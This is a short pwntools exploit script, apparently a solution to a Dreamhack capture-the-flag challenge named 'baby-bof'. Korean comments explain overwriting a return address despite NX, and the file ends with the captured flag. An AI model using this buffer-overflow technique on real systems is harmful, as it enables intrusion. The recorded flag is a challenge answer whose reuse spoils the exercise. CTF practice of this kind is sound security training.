from pwn import *

p = process('./baby-bof')
#p = remote('host3.dreamhack.games', '18745')

# NX 보호기법이 있지만 실행흐름 변경으로 인텐하면 우회가능
# 프로그램에서 value, count에 따라 메모리를 덮을 수 있음
# 다음 실행 흐름을 가는 7ffe2c904268 메모리 값을 조정하면 실행흐름 변경 가능

p.sendlineafter(b"name: ", p64(0x12345678))
p.sendlineafter(b"value: ", b"40125b")
p.sendlineafter(b"count: ", b"4")

p.interactive()
# DH{62228e6f20a8b71372f0eceb51537c7f94b8191651ea0636ed4e48857c5b340c}